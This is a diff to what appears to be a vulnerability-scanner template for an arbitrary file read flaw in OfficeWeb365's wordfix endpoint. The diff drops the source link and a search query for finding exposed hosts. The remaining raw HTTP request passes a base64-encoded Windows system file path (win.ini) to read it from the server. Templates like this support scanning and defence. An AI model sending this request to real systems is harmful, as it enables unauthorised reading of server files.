@@ -3,14 +3,8 @@ info:
   name: OfficeWeb365wordfix存在任意读取漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/2b48b4d8f660bd426262350cc89de478
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 2b48b4d8f660bd426262350cc89de478
-    fofa: + hunter：`app.name="OfficeWeb365"`
 http:
 - raw:
   - 'GET /wordfix/Index?f=YzovV2luZG93cy93aW4uaW5p HTTP/2
